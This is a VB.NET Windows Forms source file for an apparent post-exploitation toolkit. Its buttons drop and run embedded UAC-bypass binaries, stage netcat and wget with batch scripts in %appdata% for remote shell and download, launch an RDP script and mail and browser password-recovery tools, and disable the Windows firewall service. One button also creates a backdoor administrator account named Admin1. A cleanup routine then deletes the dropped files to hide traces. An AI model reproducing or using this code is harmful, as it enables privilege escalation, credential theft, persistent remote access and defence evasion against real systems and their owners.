Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim filename As String = "cmd1.exe"
        System.IO.File.WriteAllBytes(filename, My.Resources.cmd2)

        'If you want to then run it:
        Process.Start(filename)
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim filename As String = "regedit2.exe"
        System.IO.File.WriteAllBytes(filename, My.Resources.regedit2)

        'If you want to then run it:
        Process.Start(filename)
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim filename As String = "taskmgr2.exe"
        System.IO.File.WriteAllBytes(filename, My.Resources.taskmgr2)

        'If you want to then run it:
        Process.Start(filename)
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        MsgBox("Be sure you run this program as ADMIN")
        Process.Start("CMD", "/C sc stop MpsSvc")
        Process.Start("CMD", "/C sc config MpsSvc start=disabled")
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        MsgBox("Be sure you run this program as ADMIN")
        Process.Start("CMD", "/C net user /add Admin1 Privileged1")
        Process.Start("CMD", "/C net localgroup administrators Admin1 /add")
        MsgBox("User:Password    =   Admin1 Privileged1")

    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Dim filename As String = "x86.exe"
        System.IO.File.WriteAllBytes(filename, My.Resources.uac_bypass_x86)

        'If you want to then run it:
        Process.Start(filename)
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Dim filename As String = "x64.exe"
        System.IO.File.WriteAllBytes(filename, My.Resources.uac_bypass_x64)

        'If you want to then run it:
        Process.Start(filename)
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        System.IO.File.WriteAllBytes("cmd2.exe", My.Resources.cmd2)
        System.IO.File.WriteAllBytes("nc.exe", My.Resources.nc)
        System.IO.File.WriteAllBytes("ncr.bat", My.Resources.ncr)
        'Process.Start("CMD", "/C move cmd2.exe %appdata%\cmd2.exe")
        Process.Start("cmd2", "/C move nc.exe %appdata%\nc.exe")
        Process.Start("cmd2", "/C move ncr.bat %appdata%\ncr.bat")
        Process.Start("cmd2", "/k TIMEOUT /T 3 & %appdata%\ncr.bat")
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        Dim filename As String = "ip.vbs"
        System.IO.File.WriteAllBytes(filename, My.Resources.ip)

        Process.Start("ip.vbs")
    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        Dim filename As String = "browser.exe"
        System.IO.File.WriteAllBytes(filename, My.Resources.browser)

        Process.Start("browser.exe")
    End Sub

    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click
        Dim filename As String = "mailpv.exe"
        System.IO.File.WriteAllBytes(filename, My.Resources.mailpv)

        Process.Start("mailpv.exe")
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs)
        Process.Start("CMD", "/C TASKKILL /IM ip.vbs /F")
        Process.Start("CMD", "/C TASKKILL /IM browser.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM mailpv.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM x64.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM x86.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM cmd2.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM regedit2.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM taskmgr2.exe /F")
        Process.Start("CMD", "/C del ip.vbs")
        Process.Start("CMD", "/C del browser.exe")
        Process.Start("CMD", "/C del mailpv.exe")
        Process.Start("CMD", "/C del x64.exe")
        Process.Start("CMD", "/C del x86.exe")
        Process.Start("CMD", "/C del cmd2.exe")
        Process.Start("CMD", "/C del regedit2.exe")
        Process.Start("CMD", "/C del taskmgr2.exe")
        Process.Start("CMD", "/C del browser.cfg")
        Process.Start("CMD", "/C del mailpv.cfg")
        Process.Start("CMD", "/C del rdp.bat")
        Button11_Click()
        MsgBox("All files stopped And removed")
    End Sub

    Private Sub Button11_Click()
        Process.Start("CMD", "/C TASKKILL /IM ip.vbs /F")
        Process.Start("CMD", "/C TASKKILL /IM browser.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM mailpv.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM x64.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM x86.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM cmd2.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM regedit2.exe /F")
        Process.Start("CMD", "/C TASKKILL /IM taskmgr2.exe /F")
        Process.Start("CMD", "/C del ip.vbs")
        Process.Start("CMD", "/C del browser.exe")
        Process.Start("CMD", "/C del mailpv.exe")
        Process.Start("CMD", "/C del x64.exe")
        Process.Start("CMD", "/C del x86.exe")
        Process.Start("CMD", "/C del cmd2.exe")
        Process.Start("CMD", "/C del regedit2.exe")
        Process.Start("CMD", "/C del taskmgr2.exe")
        Process.Start("CMD", "/C del browser.cfg")
        Process.Start("CMD", "/C del mailpv.cfg")
        Process.Start("CMD", "/C del rdp.bat")
    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        Dim filename As String = "clean.bat"
        System.IO.File.WriteAllBytes(filename, My.Resources.clean)
        MsgBox("Be sure you run this program As ADMIN! any generated files will be deleted")
        Process.Start("clean.bat")
        Process.Start("CMD", "/C TASKKILL /IM clean.bat /F")
        Process.Start("CMD", "/C del clean.bat")
        Button11_Click()
    End Sub

    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
        Dim filename As String = "CreateObjectTaskCPP.exe"
        System.IO.File.WriteAllBytes(filename, My.Resources.CreateObjectTaskCPP)
        'If you want to then run it:
        Process.Start(filename)
    End Sub

    Private Sub Button16_Click(sender As Object, e As EventArgs) Handles Button16.Click
        Dim url As String
        url = "https://www.exploit-db.com/local/"
        Process.Start("iexplore", url)
    End Sub

    Private Sub Button11_Click_1(sender As Object, e As EventArgs) Handles Button11.Click
        System.IO.File.WriteAllBytes("cmd3.exe", My.Resources.cmd2)
        System.IO.File.WriteAllBytes("wget.exe", My.Resources.wget)
        System.IO.File.WriteAllBytes("wg.bat", My.Resources.wg)
        'Process.Start("CMD", "/C move cmd2.exe %appdata%\cmd2.exe")
        Process.Start("cmd3", "/C move wget.exe %appdata%\wget.exe")
        Process.Start("cmd3", "/C move wg.bat %appdata%\wg.bat")
        Process.Start("cmd3", "/k TIMEOUT /T 3 & %appdata%\wg.bat")
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        System.IO.File.WriteAllBytes("rdp.bat", My.Resources.rdp)
        Process.Start("cmd", "/k rdp.bat")
    End Sub

End Class